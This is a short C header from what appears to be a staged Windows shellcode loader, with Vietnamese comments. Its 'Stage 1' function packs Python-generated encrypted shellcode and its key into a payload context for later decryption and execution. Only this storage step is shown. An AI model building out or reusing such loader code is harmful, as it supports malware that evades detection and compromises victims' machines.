#pragma once
#include "../../core/utils.h"
#include <windows.h>

// Các biến toàn cục do Python tạo ra
extern unsigned char shellcode[];
extern unsigned int shellcode_len;
extern unsigned char key[];
extern unsigned int key_len;
// extern unsigned char nonce[];
// extern unsigned int nonce_len;

typedef struct {
    unsigned char* data;
    int length;

    unsigned char* key;
    int key_len;

    unsigned char* nonce;
    int nonce_len;

    unsigned char* allocated_mem;
} PayloadContext;

PayloadContext Stage1_Storage_GetData() {
    PayloadContext ctx;

    ctx.data = shellcode;
    ctx.length = shellcode_len;

    ctx.key = key;
    ctx.key_len = key_len;

    // ctx.nonce = nonce;
    // ctx.nonce_len = nonce_len;

    ctx.allocated_mem = NULL;

    if (ctx.length == 0) {
        DEBUG_MSG("Stage 1", "Shellcode length is 0");
    }

    return ctx;
}